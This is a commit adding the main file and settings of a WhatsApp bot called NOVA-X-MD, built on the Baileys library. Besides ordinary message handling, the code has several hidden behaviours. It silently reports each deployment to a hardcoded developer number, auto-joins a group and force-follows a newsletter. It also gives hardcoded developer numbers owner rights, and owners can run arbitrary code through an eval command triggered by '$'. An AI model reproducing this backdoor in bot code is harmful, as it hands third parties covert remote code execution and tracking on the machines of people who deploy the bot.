0a0663617033bf1954878c2aee67c130ca77c94b
luxalgo2025 <pathummalsara16@gmail.com>
2025-08-29 22:58:57 +0530

    Add files via upload

---
+++ index.js
@@ -0,0 +1,420 @@
+const {
+    default: makeWASocket,
+    getAggregateVotesInPollMessage, 
+    useMultiFileAuthState,
+    DisconnectReason,
+    getDevice,
+    fetchLatestBaileysVersion,
+    jidNormalizedUser,
+    getContentType,
+    Browsers,
+    makeInMemoryStore,
+    makeCacheableSignalKeyStore,
+    downloadContentFromMessage,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    prepareWAMessageMedia,
+    proto
+} = require('@whiskeysockets/baileys')
+const { 
+  getBuffer, 
+  getGroupAdmins, 
+  getRandom, 
+  h2k, 
+  isUrl, 
+  Json, 
+  runtime, 
+  sleep, 
+  fetchJson 
+} = require('./lib/functions')
+const fs = require('fs')
+const P = require('pino')
+const FileType = require('file-type')
+const l = console.log
+var config = require('./settings')
+const qrcode = require('qrcode-terminal')
+const NodeCache = require('node-cache')
+const util = require('util')
+const { 
+  sms,
+  downloadMediaMessage 
+} = require('./lib/msg')
+const axios = require('axios')
+const { File } = require('megajs')
+const { exec } = require('child_process');
+const { tmpdir } = require('os')
+const Crypto = require('crypto')
+
+const Jimp = require('jimp')
+
+var prefix = config.PREFIX
+var prefixRegex = config.prefix === "false" || config.prefix === "null" ? "^" : new RegExp('^[' + config.PREFIX + ']');
+
+ function genMsgId() {
+  const prefix = "3EB";
+  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let randomText = prefix;
+
+ for (let i = prefix.length; i < 22; i++) {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    randomText += characters.charAt(randomIndex);
+  }   
+ return randomText;
+}    
+
+const path = require('path')
+const msgRetryCounterCache = new NodeCache()
+
+const ownerNumber = ['94761068032', '94741259325'];
+//================== SESSION ==================
+if (!fs.existsSync(__dirname + '/session/creds.json')) {
+    if (!config.SESSION_ID) return console.log("Please Add SESSION_ID ➾")
+      const sessdata = config.SESSION_ID.split("KSMD~")[1];
+      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
+      filer.download((err, data) => {
+        if (err) throw err
+        fs.writeFile(__dirname + '/session/creds.json', data, () => {
+          console.log("Session download completed !!")
+        })
+      })
+    
+  }
+
+//==================  PORTS ==================
+
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 9000;
+
+async function connectToWA() {;
+	console.log("Connecting NOVA-X-MD🔃");
+    const {
+        version,
+        isLatest
+    } = await fetchLatestBaileysVersion()
+    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
+    const {
+        state,
+        saveCreds
+    } = await useMultiFileAuthState(__dirname + '/session/')
+    const conn = makeWASocket({
+        logger: P({
+            level: "fatal"
+        }).child({
+            level: "fatal"
+        }),
+        printQRInTerminal: true,
+        generateHighQualityLinkPreview: true,
+        auth: state,
+        defaultQueryTimeoutMs: undefined,
+        msgRetryCounterCache
+    })
+
+  conn.ev.on('connection.update', async (update) => {
+        const {
+            connection,
+            lastDisconnect
+        } = update
+        if (connection === 'close') {
+            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+                connectToWA()
+            }
+        } else if (connection === 'open') {
+
+            console.log('Installing plugins 🧬... ')
+			 console.log(' Bot connected ✅')
+		const inviteCode =`IYh8ZzJZLuX3wCHhfyip8W`
+conn.groupAcceptInvite(inviteCode);	
+			
+			// image with caption
+         await conn.sendMessage(
+           "94761068032@s.whatsapp.net",
+         {
+       image: { url: "https://files.catbox.moe/rxaw7o.jpeg" }, // image url
+       caption: "Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _NOVA-X-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ https://king-sandesh-md-ofc-web.pages.dev/\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://whatsapp.com/channel/0029Vb7bwXEEAKWNJgBICJ0w\n┃ https://whatsapp.com/channel/0029Vb5saAU4Y9lfzhgBmS2N\n╰───────────❍\n╭───❍「 *👤BOT OWNER* 」\n┃ _Mr Sandesh Bhashana_\n┃ _Mr. Pathum Malsara_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ ${prefix}\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ > *NOVA X TECHNICAL💸*\n╰───────────❍"
+     }
+   )
+            const path = require('path');
+            fs.readdirSync("./plugins/").forEach((plugin) => {
+                if (path.extname(plugin).toLowerCase() == ".js") {
+                    require("./plugins/" + plugin);
+                }
+            });
+            console.log('NOVA-X-MD Plugins installed 📂')
+            console.log(' Bot connected ✅')
+	 
+	 // bot connected notification without admin variable
+conn.sendMessage("94761068032@s.whatsapp.net", { text: "Bot started✅" });
+//================== CONNECT MG ==================
+
+let up = "Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _NOVA-X-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ https://king-sandesh-md-ofc-web.pages.dev/\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://whatsapp.com/channel/0029Vb7bwXEEAKWNJgBICJ0w\n┃ https://whatsapp.com/channel/0029Vb5saAU4Y9lfzhgBmS2N\n╰───────────❍\n╭───❍「 *👤BOT OWNER* 」\n┃ _Mr Sandesh Bhashana_\n┃ _Mr. Pathum Malsara_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ ${prefix}\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ > *NOVA X TECHNICAL💸*\n╰───────────❍";
+
+conn.sendMessage(conn.user.id,{ text: up, contextInfo: {
+        mentionedJid: [''],
+        groupMentions: [],
+        //forwardingScore: 999,
+        isForwarded: true,
+        forwardedNewsletterMessageInfo: {
+          newsletterJid: '120363409414874042@newsletter',
+          newsletterName: "NOVA-X-MD",
+          serverMessageId: 999
+        },
+        externalAdReply: { 
+          title: '🧬 LUXALGO BOT 🧬\nSuccessfully Connected !',
+          body: 'ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴘᴀᴛʜᴜᴍ ᴍᴀʟꜱᴀʀᴀ',
+          mediaType: 1,
+          sourceUrl: "",
+          thumbnailUrl: "https://files.catbox.moe/rxaw7o.jpeg",
+          renderLargerThumbnail: true,
+          showAdAttribution: true
+        }
+      } 
+})
+
+}
+})
+
+
+
+conn.ev.on('creds.update', saveCreds)  
+
+    conn.ev.on('messages.upsert', async (mek) => {
+      try {
+            mek = mek.messages[0]
+            if (!mek.message) return
+            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+
+//================== AUTO STATUS VIEW ==================
+
+if (!mek.message) return	
+mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
+await conn.readMessages([mek.key])  
+const mnyako = await jidNormalizedUser(conn.user.id)
+await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: '🎉'}}, { statusJidList: [mek.key.participant, mnyako] })
+}	      
+	    if (mek.key && mek.key.remoteJid === 'status@broadcast') return
+            const m = sms(conn, mek)
+	          var smg = m
+            const type = getContentType(mek.message)
+            const content = JSON.stringify(mek.message)
+            const from = mek.key.remoteJid
+
+//================== QUOTED ==================
+
+const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+
+//================== C FOLLOW ==================
+
+const metadata = await conn.newsletterMetadata("jid", "120363402220977044@newsletter");
+if (metadata.viewer_metadata === null) {
+  await conn.newsletterFollow("120363402220977044@newsletter");
+  console.log("NOVA-X-MD CHANNEL FOLLOW ✅");
+}
+
+
+//================== BODY ==================
+
+const body = 
+  (type === 'conversation') ? mek.message.conversation :
+  (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
+  (type === 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption :
+  (type === 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption :
+  (type === 'templateButtonReplyMessage' && mek.message.templateButtonReplyMessage.selectedId) ? mek.message.templateButtonReplyMessage.selectedId :
+  (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId :
+  (type === 'listResponseMessage' && mek.message.listResponseMessage.singleSelectReply.selectedRowId) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId :
+  (type === 'interactiveResponseMessage' &&
+    mek.message.interactiveResponseMessage.nativeFlowResponseMessage &&
+    JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id
+  ) ? JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
+  ''
+      
+
+	          const isCmd = body.startsWith(prefix)	    
+            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+            const args = body.trim().split(/ +/).slice(1)
+            const q = args.join(' ')
+            const isGroup = from.endsWith('@g.us')
+            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+            const senderNumber = sender.split('@')[0]
+            const botNumber = conn.user.id.split(':')[0]
+            const pushname = mek.pushName || 'NOVA-X-MD'
+	          const ownbot = config.SUDO
+	          const isownbot = ownbot?.includes(senderNumber)
+	          const developers = '94773416478'
+            const isbot = botNumber.includes(senderNumber)
+	          const isdev = developers.includes(senderNumber) 	    
+	          const botNumber2 = await jidNormalizedUser(conn.user.id)
+            const isCreator = [ botNumber2 ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)	  
+	          const isMe = isbot ? isbot : isdev
+            const isOwner = ownerNumber.includes(senderNumber) || isMe
+            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+            const groupName = isGroup ? groupMetadata.subject : ''
+            const participants = isGroup ? await groupMetadata.participants : ''
+            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+            const isreaction = m.message.reactionMessage ? true : false
+            const isReact =m.message.reactionMessage ? true : false
+	    const isAnti = (teks) => {
+                let getdata = teks
+                for (let i = 0; i < getdata.length; i++) {
+                    if (getdata[i] === from) return true
+                }
+                return false
+            }
+            const reply = async(teks) => {
+  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
+}
+    
+conn.edite = async (gg, newmg) => {
+  await conn.relayMessage(from, {
+    protocolMessage: {
+key: gg.key,
+type: 14,
+editedMessage: {
+  conversation: newmg
+}
+    }
+  }, {})
+}
+
+
+//================== For RVO ==================
+       
+        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+                let quoted = message.msg ? message.msg : message
+                let mime = (message.msg || message).mimetype || ''
+                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+                const stream = await downloadContentFromMessage(quoted, messageType)
+                let buffer = Buffer.from([])
+                for await (const chunk of stream) {
+                    buffer = Buffer.concat([buffer, chunk])
+                }
+                let type = await FileType.fromBuffer(buffer)
+                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+                    // save to file
+                await fs.writeFileSync(trueFileName, buffer)
+                return trueFileName
+            }
+
+//================== FORWARD ==================
+       
+conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
+            let vtype
+            if (options.readViewOnce) {
+                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+                delete message.message.viewOnceMessage.message[vtype].viewOnce
+                message.message = {
+                    ...message.message.viewOnceMessage.message                             
+                }
+            }
+
+            let mtype = Object.keys(message.message)[0]
+            let content = await generateForwardMessageContent(message, forceForward)
+            let ctype = Object.keys(content)[0]
+            let context = {}
+            if (mtype != "conversation") context = message.message[mtype].contextInfo
+            content[ctype].contextInfo = {
+                ...context,
+                ...content[ctype].contextInfo
+            }
+            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+                ...content[ctype],
+                ...options,
+                ...(options.contextInfo ? {
+                    contextInfo: {
+                        ...content[ctype].contextInfo,
+                        ...options.contextInfo
+                    }
+                } : {})
+            } : {})
+            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+            return waMessage
+}
+
+//================== OWN REACT ==================
+       
+if(senderNumber.includes("94773416478")){
+if(isReact) return
+m.react("👨‍💻")
+}
+
+//================== WORK TYPE ==================
+       
+if(!isOwner && config.MODE === "private") return 
+if(!isOwner && isGroup && config.MODE === "inbox") return 
+if(!isOwner && !isGroup && config.MODE === "groups") return 
+
+//================== PLUGIN MAP ==================
+       
+const events = require('./lib/command')
+const cmdName = isCmd ?  command : false;
+if (isCmd) {
+  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+  if (cmd) {
+    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
+
+    try {
+cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, botNumber2 });
+    } catch (e) {
+console.error("[PLUGIN ERROR] ", e);
+    }
+  }
+}
+events.commands.map(async (command) => {
+  if (body && command.on === "body") {
+    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, botNumber2 });
+  } else if (mek.q && command.on === "text") {
+    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
+  } else if (
+    (command.on === "image" || command.on === "photo") &&
+    mek.type === "imageMessage"
+  ) {
+    command.function(conn, mek, m, { from, prefix, l, quoted, body,  isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
+  } else if (
+    command.on === "sticker" &&
+    mek.type === "stickerMessage"
+  ) {
+    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
+  }
+});
+
+
+
+
+            switch (command) {
+        case 'jid':
+        reply(from)
+        break
+        
+        default:				
+        if (isOwner && body.startsWith('$')) {
+        let bodyy = body.split('$')[1]
+        let code2 = bodyy.replace("°", ".toString()");
+        try {
+        let resultTest = await eval(code2);
+        if (typeof resultTest === "object") {
+        reply(util.format(resultTest));
+        } else {
+        reply(util.format(resultTest));
+        }
+        } catch (err) {
+        reply(util.format(err));
+        }}}
+        } catch (e) {
+            const isError = String(e)
+            console.log(isError)
+        }
+    })
+}
+app.get("/", (req, res) => {
+res.send("NOVA-X-MD CONNECTED SUCCESSFUL✅");
+});
+app.listen(port, () => console.log(`NOVA-X-MD Server listening on port http://localhost:` + port));
+setTimeout(() => {
+connectToWA()
+}, 9000);
+    
---
+++ settings.js
@@ -0,0 +1,11 @@
+const fs = require('fs');
+if (fs.existsSync('config.env')) require('dotenv').config({ path: './config.env' });
+function convertToBool(text, fault = 'true') {
+    return text === fault ? true : false;
+}
+module.exports = {
+
+SESSION_ID: process.env.SESSION_ID === undefined ? 'KSMD~2oQ0GJQI#FsUeb8W2XqDNmPLBGHEl72Nbp1jibY5ea-ssNJPSJrI' : process.env.SESSION_ID,
+PREFIX: process.env.PREFIX || '.' ,
+MODE: process.env.MODE === undefined ?"groups" : process.env.MODE,
+AUTO_READ_STATUS: process.env.AUTO_READ_STATUS === undefined ?"true" : process.env.AUTO_READ_STATUS
